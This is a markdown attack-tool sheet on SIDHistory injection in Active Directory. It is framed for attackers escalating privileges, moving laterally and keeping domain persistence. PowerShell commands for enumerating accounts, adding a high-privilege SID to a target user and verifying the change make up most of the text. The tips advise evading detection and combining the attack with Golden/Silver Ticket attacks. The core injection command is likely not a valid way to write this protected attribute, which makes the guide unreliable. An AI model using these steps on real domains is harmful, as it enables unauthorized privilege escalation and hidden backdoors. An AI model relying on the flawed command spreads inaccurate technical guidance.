# SIDHistoryInjection

**Type:** Active Directory Attack / Privilege Escalation Tool
**Focus:** Injecting SIDs into user accounts to gain unauthorized access

---

## 1. Full Feature Overview

* Exploits `sIDHistory` attribute in AD to escalate privileges
* Allows attackers to inherit permissions from other accounts or groups
* Works with AD PowerShell modules or via LDAP
* Can bypass normal permission checks if SIDHistory is trusted
* Often used for lateral movement and domain persistence
* Compatible with Windows AD environments

---

## 2. Requirements & Setup

### Requirements

* Administrative privileges or AD write access
* PowerShell (Windows)
* LDAP/AD module access (`ActiveDirectory` module)

### Installation

* No separate installation; uses PowerShell or custom scripts
* Tools like PowerView or SharpHound can assist in enumeration

---

## 3. Core Usage

### 3.1 Enumerate Existing SIDHistory

```powershell
# List all users with SIDHistory attribute
Get-ADUser -Filter * -Properties SIDHistory | 
Where-Object { $_.SIDHistory } | 
Select-Object Name,SIDHistory
```

### 3.2 Inject SID into User

```powershell
# Inject SID of high-privilege account into target
Set-ADUser -Identity TargetUser -Add @{SIDHistory="S-1-5-21-xxxx"}
```

### 3.3 Verify Injection

```powershell
# Confirm the injected SID
Get-ADUser TargetUser -Properties SIDHistory
```

---

## 4. Tips, Tricks, Best Practices

* Only inject SIDs from trusted accounts to avoid detection
* Combine with Golden/Silver Ticket attacks for maximum access
* Use auditing to monitor SIDHistory modifications
* Clean up after test if in a lab to avoid persistent backdoors
* SIDHistory can bypass ACL restrictions if target system trusts the SID

---

## 5. Cheat Sheet

```powershell
# Enumerate SIDHistory
Get-ADUser -Filter * -Properties SIDHistory | Where-Object { $_.SIDHistory } | Select Name,SIDHistory

# Inject SID into target user
Set-ADUser -Identity TargetUser -Add @{SIDHistory="S-1-5-21-xxxx"}

# Verify SID injection
Get-ADUser TargetUser -Properties SIDHistory
```

---
